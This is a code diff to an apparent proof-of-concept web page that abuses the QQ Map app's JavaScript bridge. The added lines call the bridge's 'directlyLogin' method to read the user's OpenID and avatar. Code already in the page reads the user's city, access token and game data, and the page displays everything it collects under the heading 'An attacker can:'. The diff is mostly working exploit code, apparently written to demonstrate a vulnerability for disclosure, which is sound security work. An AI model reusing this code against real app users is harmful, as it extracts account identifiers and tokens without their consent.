@@ -50,7 +50,16 @@
 
     <p><span class="bold-and-larger">An attacker can:</span></p>
 
+    <p><span class="larger">Get Your Personal Info:</span></p>
+    <p style="font-size: 15px;" id="AccessToken"></p>
+
     <p><span class="larger">Get Your Account Info:</span></p>
+    <p style="font-size: 15px;" id="AccountAvatarText">Your Avatar: </p>
+    <div class="image-with-text">
+        <img id="AccountAvatar" src="" alt="" width="30%" height="auto">
+    </div>
+    <p style="font-size: 15px;" id="OpenID"></p>
+
     <p style="font-size: 15px;" id="AccessToken"></p>
     <p style="font-size: 15px;" id="GameID"></p>
     <p style="font-size: 15px;" id="CurrentSong"></p>
@@ -79,12 +88,25 @@
             case "callback_currentCity":
                 document.getElementById("City").innerText = "Your City: " + json.currentCity;
                 break;
+            
+            case "callback_directlyLogin":
+                document.getElementById("OpenID").innerText = "Your OpenID: " + json.openId;
+                document.getElementById("AccountAvatar").src = json.faceUrl;
+                break;
+            
         }
     }
 
     window.webkit.messageHandlers.qqmapJsbridgeMessageHandler.postMessage({ 
         callbackName : "callback_currentCity",
         method : "currentCity",
+        namespace : "common",
+        param : {},
+    });
+
+    window.webkit.messageHandlers.qqmapJsbridgeMessageHandler.postMessage({ 
+        callbackName : "callback_directlyLogin",
+        method : "directlyLogin",
         namespace : "common",
         param : {},
     });
